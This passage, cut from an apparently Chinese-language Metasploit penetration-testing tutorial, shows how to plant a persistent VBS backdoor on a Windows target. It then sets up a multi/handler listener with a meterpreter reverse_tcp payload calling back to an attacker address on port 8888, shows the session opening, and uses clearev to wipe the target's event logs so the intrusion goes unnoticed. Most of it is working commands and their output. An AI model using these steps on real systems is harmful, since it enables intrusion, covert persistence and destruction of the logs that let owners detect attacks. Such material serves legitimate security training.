    \ persistence -X -i 5-p 8888192.168.29.134\n```\n从输出信息中，我们可以看到目标主机上创建了一个可执行的脚本。其中，脚本文件名为\
    \ `MIknXebtV.vbs`。此时，用户可以在目标主机的 `C:\\Windows\\TEMP` 目录下看到该文件。\n\n在用户于目标主机上创建持久化后门后，还需要本地建立一个监听器。这样，当目标主机重启时，它会自动与攻击主机建立连接。以下将使用\
    \ `exploit/multi/handler` 模块建立监控器。\n\n1) 选择 `exploit/multi/handler` 模块。\n\n执行命令如下：\n\
    \n```\nmsf5> use exploit/multi/handler\nmsf5 exploit(multi/handler)>\n```\n\n\
    2) 加载攻击 payload 并查看配置选项。\n\n执行命令如下：\n\n```\nmsf5 exploit(multi/handler)> set payload\
    \ windows/meterpreter/reverse_tcp\n```\n从输出信息可以看出，所需的项 `LHOST` 尚未配置。此外，该模块监控的端口为\
    \ `4444`。由于端口 `4444` 之前已被监控过，我们将修改另一个监控端口，例如 `8888`。\n\n3) 配置攻击 payload。\n\n执行命令如下：\n\
    \n```\nmsf5 exploit(multi/handler)> set LHOST 192.168.29.134\nmsf5 exploit(multi/handler)>\
    \ set LPORT 8888\n```\n\n4) 建立监控。\n\n执行命令如下：\n\n```\nmsf5 exploit(multi/handler)>\
    \ exploit\n```\n`[＊] Started reverse handler on 192.168.29.134:8888`\n\n5) 当目标主机重启时，它将主动与攻击主机建立连接，如下：\n\
    \n```\n[＊] Sending stage (17979 bytes) to 192.168.29.143\n```\n从输出信息中，我们可以看到开启了一个\
    \ Meterpreter 会话。\n\n### 清除轨迹\n\n当渗透测试人员入侵目标主机时，所有操作都会记录在目标系统的日志文件中。因此，为了不被目标系统发现，清除痕迹非常重要。此时，用户可以使用\
    \ `clearev` 命令清除痕迹。\n\n执行命令如下：\n\n```\nmeterpreter> clearev\n```\n你可以从输出信息中看到被清除的记录。其中，清除了\
